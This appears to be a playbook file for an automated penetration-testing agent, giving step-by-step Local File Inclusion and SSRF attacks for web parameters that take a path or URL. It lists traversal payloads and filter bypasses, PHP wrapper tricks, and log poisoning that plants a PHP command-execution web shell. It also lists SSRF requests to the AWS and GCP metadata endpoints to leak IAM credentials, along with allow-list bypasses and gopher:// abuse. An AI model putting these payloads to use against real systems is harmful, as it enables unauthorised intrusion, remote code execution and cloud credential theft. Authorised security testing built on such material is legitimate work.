---
name: lfi_ssrf
description: Local File Inclusion / SSRF playbook — a parameter that takes a path or URL
when_to_use: A web request has a parameter that names a file, template, or URL (file=, path=, page=, url=, next=, dest=, image=, feed=)
ports: [80, 443, 3000, 5000, 8000, 8080, 8443, 8888]
keywords: [lfi, rfi, ssrf, path traversal, file inclusion, file=, path=, page=, url=, redirect, ../]
target_scheme: [http, https]
phase: exploitation
tools: [http_request]
---
ACTIVE PLAYBOOK — a request parameter takes a FILE PATH or a URL. Two related
classes live here; pick by what the parameter feeds.

LOCAL FILE INCLUSION / PATH TRAVERSAL (parameter names a file/template/page):
- Read a known file: set the param to `../../../../etc/passwd` (Linux) or
  `..\..\..\..\windows\win.ini` (Windows). Confirm by the file's contents coming back.
- Defeat filters: URL-encode the traversal (`%2e%2e%2f`), double-encode (`%252e%252e%252f`),
  or use a poison null byte to drop an appended extension (`...%00`, `...%2500`).
- Wrappers (PHP): `php://filter/convert.base64-encode/resource=index.php` leaks source;
  `data://` / `expect://` can reach RCE if enabled.
- Log poisoning → RCE: if you can include a log you control (access log, /proc/self/environ),
  inject `<?php system($_GET[c]); ?>` via User-Agent, then include the log with `&c=id`.

SERVER-SIDE REQUEST FORGERY (parameter takes a URL / fetches a resource):
- Prove it: point the param at a collaborator you control (or the app's own host) and
  watch for the callback / a different response.
- Reach internal-only services: `http://127.0.0.1:<port>/`, `http://localhost/admin`,
  and the cloud metadata endpoint `http://169.254.169.254/latest/meta-data/` (AWS) or
  `http://metadata.google.internal/` (GCP) — often leaks IAM creds / tokens.
- Bypass allow-lists: alternate IP encodings (`http://2130706433/` = 127.0.0.1),
  `http://[::1]/`, a redirect on a host you control, or `@`-tricks (`http://allowed@evil/`).
- Scheme abuse: `file:///etc/passwd`, `gopher://` to forge requests to internal TCP services.

PROOF = the actual retrieved file contents, the internal service's response, or the
leaked credential/token returned by a request YOU issued — never a payload you did not send.
